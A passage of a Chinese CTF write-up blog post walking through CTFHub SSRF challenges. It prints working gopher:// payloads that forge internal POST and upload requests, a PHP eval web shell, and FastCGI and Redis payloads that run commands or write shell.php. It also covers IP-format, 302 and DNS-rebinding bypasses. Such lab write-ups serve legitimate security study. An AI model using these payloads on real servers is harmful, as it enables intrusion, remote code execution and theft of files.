+http:&#x2F;&#x2F;challenge-351296691c42d118.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.01:80&#x2F;_POST%2520%2Fflag.php%2520HTTP%2F1.1%250d%250AHost%3A127.0.0.1%250d%250AContent-Type%3Aapplication%2Fx-www-form-urlencoded%250d%250AContent-Length%3A36%250d%250A%250d%250Akey%3D646e343c70a1b9d07661c4343b0e5e72%250d%250A</code></pre>
+
+<p>第一个是对</p>
+<pre class="language-none"><code class="language-none">POST &#x2F;flag.php HTTP&#x2F;1.1
+Host:127.0.0.1
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 36
+
+key&#x3D;646e343c70a1b9d07661c4343b0e5e72</code></pre>
+
+<p>用谷歌的hackbar上的自带的url编码进行一次编码，将换行符%0A换为%0D%0A，然后再编码一次</p>
+<p>第二个是直接改之前测试post的时候的值</p>
+<pre class="language-none"><code class="language-none">curl gopher:&#x2F;&#x2F;ip:80&#x2F;_POST%20&#x2F;ssrf&#x2F;test&#x2F;test.php%20HTTP&#x2F;1.1%0d%0AHost:ip%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname&#x3D;Margin%0d%0A</code></pre>
+
+<p>然后再用谷歌的hackbar进行一次编码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429113209009.png" alt="image-20220429113209009"></p>
+<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>和post差不多吗，但是要穿的是文件，所以改一下前端页面，加个提交按钮，抓包</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429160323521.png" alt="image-20220429160323521"></p>
+<p>然后直接把整个请求包改了host之后去url编码一次</p>
+<pre class="language-none"><code class="language-none">POST &#x2F;flag.php HTTP&#x2F;1.1
+Host: 127.0.0.1:80
+Content-Length: 308
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+Origin: http:&#x2F;&#x2F;challenge-abdf75c2760a97e9.sandbox.ctfhub.com:10800
+Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryXT85fz2P3lDnY3Aw
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;100.0.4896.127 Safari&#x2F;537.36 Edg&#x2F;100.0.1185.50
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Referer: http:&#x2F;&#x2F;challenge-abdf75c2760a97e9.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;127.0.0.1&#x2F;flag.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6
+Connection: close
+
+------WebKitFormBoundaryXT85fz2P3lDnY3Aw
+Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.pdf&quot;
+Content-Type: application&#x2F;pdf
+
+&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;
+------WebKitFormBoundaryXT85fz2P3lDnY3Aw
+Content-Disposition: form-data; name&#x3D;&quot;file&quot;
+
+æäº¤
+------WebKitFormBoundaryXT85fz2P3lDnY3Aw--</code></pre>
+
+<p>然后再将%0a变为%0d%0a，然后再编码一次</p>
+<p>最终payload</p>
+<pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%2520308%250D%250APragma%253A%2520no-cache%250D%250ACache-Control%253A%2520no-cache%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-abdf75c2760a97e9.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F100.0.4896.127%2520Safari%252F537.36%2520Edg%252F100.0.1185.50%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Fwebp%252Cimage%252Fapng%252C*%252F*%253Bq%253D0.8%252Capplication%252Fsigned-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-abdf75c2760a97e9.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%252Cen%253Bq%253D0.8%252Cen-GB%253Bq%253D0.7%252Cen-US%253Bq%253D0.6%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.pdf%2522%250D%250AContent-Type%253A%2520application%252Fpdf%250D%250A%250D%250A%253C%253Fphp%2520%2540eval(%2524_POST%255B%2522a%2522%255D)%253B%253F%253E%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw--</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429162248432.png" alt="image-20220429162248432"></p>
+<h3 id="FastCGI协议-1"><a href="#FastCGI协议-1" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><p><strong>方法一</strong>：</p>
+<p>直接上gopherus</p>
+<p>其中/usr/local/lib/php/PEAR.php 为安装php时默认自带的php文件</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429170013890.png" alt="image-20220429170013890"></p>
+<p>先ls /，再cat，在url中要先把这个payload的值再url编码一次，才能拿到flag</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-5da7279b1e83a566.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2508%2500%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%251BSCRIPT_FILENAME%2Fusr%2Flocal%2Flib%2Fphp%2FPEAR.php%250D%2501DOCUMENT_ROOT%2F%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_52cc1357979c158b0cb02c8ff00b83b1%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429170110205.png" alt="image-20220429170110205"></p>
+<p><strong>方法二：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
+<p>p牛的脚本fpm.py </p>
+<p>开两个终端，一个监听自己的9000端口</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429220035078.png" alt="image-20220429220035078"></p>
+<p>另一个执行脚本</p>
+<pre class="language-none"><code class="language-none">命令：python [脚本名] -c [要执行的代码] -p [端口号] [ip] [要执行的php文件]</code></pre>
+
+<pre class="language-none"><code class="language-none">python3 fpm.py 127.0.0.1 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php -c &quot;&lt;?php system(&#39;ls&#39;);?&gt;&quot;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429220107107.png" alt="image-20220429220107107"></p>
+<p>得到exp.txt</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429220158472.png" alt="image-20220429220158472"></p>
+<p>进行url编码</p>
+<pre class="language-none"><code class="language-none">#python2
+from urllib import quote
+f &#x3D; open(&#39;D:\Desktop\exp.txt&#39;)
+ff &#x3D; f.read()
+
+print(&#39;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_&#39;+quote(ff))
+
+#gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%E8u%00%08%00%00%00%01%00%00%00%00%00%00%01%04%E8u%01%DB%00%00%11%0BGATEWAY_INTERFACEFastCGI&#x2F;1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0B
+%17SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0C%00QUERY_STRING%0B%17REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%0F%0ESERVER_SOFTWAREphp&#x2F;fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%
+0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0C%10CONTENT_TYPEapplication&#x2F;text%0E%02CONTENT_LENGTH21%09%1FPHP_VALUEauto_prepend_file%20%3D%20ph
+p%3A&#x2F;&#x2F;input%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%01%04%E8u%00%00%00%00%01%05%E8u%00%15%00%00%3C%3Fphp%20system%28%27ls%27%29%3B%3F%3E%01%05%E8u%00%00%00%00</code></pre>
+
+<p>再对得到的结果进行再次编码</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-1c4d6ae123d715b8.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%25E8u%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%25E8u%2501%25DB%2500%2500%2511%250BGATEWAY_INTERFACEFastCGI%2F1.0%250E%2504REQUEST_METHODPOST%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250B%2517SCRIPT_NAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250C%2500QUERY_STRING%250B%2517REQUEST_URI%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%250F%250ESERVER_SOFTWAREphp%2Ffcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250B%2504REMOTE_PORT9985%250B%2509SERVER_ADDR127.0.0.1%250B%2502SERVER_PORT80%250B%2509SERVER_NAMElocalhost%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250C%2510CONTENT_TYPEapplication%2Ftext%250E%2502CONTENT_LENGTH21%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%2501%2504%25E8u%2500%2500%2500%2500%2501%2505%25E8u%2500%2515%2500%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253B%253F%253E%2501%2505%25E8u%2500%2500%2500%2500</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429220326896.png" alt="image-20220429220326896"></p>
+<p>成功读到了文件，后边就是ls /然后cat /flag的操作了</p>
+<p>看到有wp用的写一句话木马的方式，然后蚁剑连接，但是我没复现成功</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121643002?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1">https://blog.csdn.net/unexpectedthing/article/details/121643002?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1</a></p>
+<h3 id="redis协议"><a href="#redis协议" class="headerlink" title="redis协议"></a>redis协议</h3><p>直接上gopherus</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222019370.png" alt="image-20220429222019370"></p>
+<p>这里如果php payload按默认的来的话应该是一个以cmd为密码的一句话木马</p>
+<pre class="language-none"><code class="language-none">url&#x3D;gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_%252A%2527%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</code></pre>
+
+<p>同样是再编码一次然后上传，之后访问shell.php就能看见结果了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222057019.png" alt="image-20220429222057019"></p>
+<h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222350965.png" alt="image-20220429222350965"></p>
+<p>要求必须有<a target="_blank" rel="noopener" href="http://notfound.ctfhub.com/">http://notfound.ctfhub.com</a></p>
+<p>可以利用@来绕过</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-eb34acd716115c01.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222336425.png" alt="image-20220429222336425"></p>
+<h3 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h3><p>ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1</p>
+<p>0.0.0.0</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222507844.png" alt="image-20220429222507844"></p>
+<p>localhost</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222628519.png" alt="image-20220429222628519"></p>
+<p>还有本地回环的其他表示方法</p>
+<p>http://[::ffff:7f00:1]</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222734210.png" alt="image-20220429222734210"></p>
+<p><a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0:80</a></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222833867.png" alt="image-20220429222833867"></p>
+<p>ip十六进制</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224122368.png" alt="image-20220429224122368"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224716467.png" alt="image-20220429224716467"></p>
+<p>ip八进制</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224213146.png" alt="image-20220429224213146"></p>
+<p>顺带一提这个正则匹配的过滤，好像还过滤了http://和/flag.php之间的点，但是你只要去了前边的http://就能绕过了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224407850.png" alt="image-20220429224407850"></p>
+<p>ip十进制</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224636453.png" alt="image-20220429224636453"></p>
+<h3 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h3><p>感觉题目环境有点问题，利用短链接并不能实现跳转，只能file协议读一下源码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429230757875.png" alt="image-20220429230757875"></p>
+<p>然后localhost或者0.0.0.0就过了</p>
+<hr>
+<p>对不起，我道歉，不是环境的问题，是国内的那些短链接生成网站的问题。。。</p>
+<p>用这个<a target="_blank" rel="noopener" href="https://tinyurl.com/app/">https://tinyurl.com/app/</a></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429232119669.png" alt="image-20220429232119669"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429232131305.png" alt="image-20220429232131305"></p>
+<h3 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89426041">浅谈DNS重绑定漏洞 - 知乎 (zhihu.com)</a></p>
+<p><strong>DNS Rebinding</strong></p>
+<p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p>
+<p><strong>具体步骤</strong></p>
+<ol>
+<li>攻击者控制恶意的DNS服务器来回复域的查询,如rebind.network</li>
+<li>攻击者通过一些方式诱导受害者加载<a href="https://link.zhihu.com/?target=http://rebind.network">http://rebind.network</a></li>
+<li>用户打开链接,浏览器就会发出DNS请求查找rebind.network的IP地址</li>
+<li>恶意DNS服务器收到受害者的请求,并使用真实IP地址进行响应,并将TTL值设置为1秒,让受害者的机器缓存很快失效</li>
+<li>从<a href="https://link.zhihu.com/?target=http://rebind.network">http://rebind.network</a>加载的网页包含恶意的js代码,构造恶意的请求到<a href="https://link.zhihu.com/?target=http://rebind.network/index">http://rebind.network/index</a>,而受害者的浏览器便在执行恶意请求</li>
+<li>一开始的恶意请求当然是发到了攻击者的服务器上,但是随着TTL时间结束,攻击者就可以让<a href="https://link.zhihu.com/?target=http://rebind.network">http://rebind.network</a>绑定到别的IP,如果能捕获受害者的一些放在内网的应用IP地址,就可以针对这个内网应用构造出对应的恶意请求,然后浏览器执行的恶意请求就发送到了内网应用,达到了攻击的效果</li>
+</ol>
+<p><strong>同源策略的失效</strong></p>
+<p>对于WEB的同源策略相信大家都很熟悉,<strong>如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源</strong>,而不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。</p>
+<p>当然,页面中的链接，重定向以及表单提交是不会受到同源策略限制的,并且,跨域资源的引入是可以的。但是js不能读写加载的内容。</p>
+<p>同源策略确实提高了web的安全性,但是对于DNS Rebinding来说是没有作用的,因为同源策略看的是域名,并不是背后的IP地址,虽然两次的请求IP地址不同,但是由于DNS服务器的绑定,域名都是一样的,那么自然不违反同源策略.</p>
+<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg</a></p>
+<p>在这个网站设置</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429231547758.png" alt="image-20220429231547758"></p>
+<p>然后访问就行了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429231604839.png" alt="image-20220429231604839"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Ethe</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://Ethe448.github.io/2022/04/26/ssrf/">https://Ethe448.github.io/2022/04/26/ssrf/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Ethe</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                                    <span class="chip bg-color">web学习</span>
+                                </a>
+                            
+                                <a href="/tags/ssrf/">
+                                    <span class="chip bg-color">ssrf</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
